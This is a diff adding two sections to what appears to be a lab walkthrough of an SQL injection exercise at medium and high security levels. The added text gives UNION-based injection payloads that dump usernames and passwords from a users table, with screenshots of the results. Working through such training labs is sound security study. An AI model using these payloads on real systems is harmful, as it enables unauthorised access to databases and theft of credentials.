@@ -613,7 +613,21 @@ We can extract all passwords with payload:
 
 **Security level is currently: medium.**
 
+It's using POST parameter and quotes are filtered, but ID value is directly added to the query so we dont even need quotes 
 
+payload: `1 or 1=1 UNION SELECT user, password FROM users#`
+
+<img width="326" alt="image" src="https://user-images.githubusercontent.com/79740895/185467076-707fd767-e575-42d1-9b86-5a16937f133d.png">
+
+**Security level is currently: high.**
+
+payload from low security also works here
+
+Payload: `' UNION SELECT user, password FROM users#`
+
+<img width="281" alt="image" src="https://user-images.githubusercontent.com/79740895/185468611-17e12bd2-8513-4844-beac-b0d8d9c27725.png">
+
+<br/>
 
 ---
 
